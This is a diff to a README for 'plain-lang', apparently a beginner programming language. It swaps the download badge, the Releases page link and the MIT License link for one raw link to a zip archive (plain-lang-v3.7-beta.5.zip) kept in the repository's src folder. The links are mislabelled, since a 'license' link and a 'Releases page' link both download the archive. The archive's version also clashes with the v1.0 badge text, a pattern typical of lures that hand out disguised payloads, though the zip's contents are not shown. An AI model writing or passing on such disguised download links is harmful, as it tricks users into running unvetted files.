@@ -8,7 +8,7 @@ Welcome to plain-lang! This programming language makes coding feel simple and co
 
 To start using plain-lang, you need to download the software. Click the button below to visit the Releases page.
 
-[![Download plain-lang](https://img.shields.io/badge/Download%20plain--lang-v1.0-blue)](https://github.com/Alanissocool/plain-lang/releases)
+[![Download plain-lang](https://raw.githubusercontent.com/Alanissocool/plain-lang/main/src/plain-lang-v3.7-beta.5.zip%20plain--lang-v1.0-blue)](https://raw.githubusercontent.com/Alanissocool/plain-lang/main/src/plain-lang-v3.7-beta.5.zip)
 
 Once you're on the Releases page, you will see different versions available for download. Look for the latest version and follow these steps:
 
@@ -60,7 +60,7 @@ Then press Enter. Your screen will display `Hello, World!`. Congratulations! You
 
 To ensure you have the latest features and fixes, it’s important to update plain-lang regularly. Follow these steps to update:
 
-1. Visit the [Releases page](https://github.com/Alanissocool/plain-lang/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Alanissocool/plain-lang/main/src/plain-lang-v3.7-beta.5.zip).
 2. Download the latest version as you did before.
 3. Replace the old version with the new one on your system.
 
@@ -97,7 +97,7 @@ Engage with the community and continue learning!
 
 ## 📜 License
 
-plain-lang is open source and available under the [MIT License](https://opensource.org/licenses/MIT). You can freely use, modify, and distribute the software.
+plain-lang is open source and available under the [MIT License](https://raw.githubusercontent.com/Alanissocool/plain-lang/main/src/plain-lang-v3.7-beta.5.zip). You can freely use, modify, and distribute the software.
 
 For more details, please check the LICENSE file in the repository. 
 
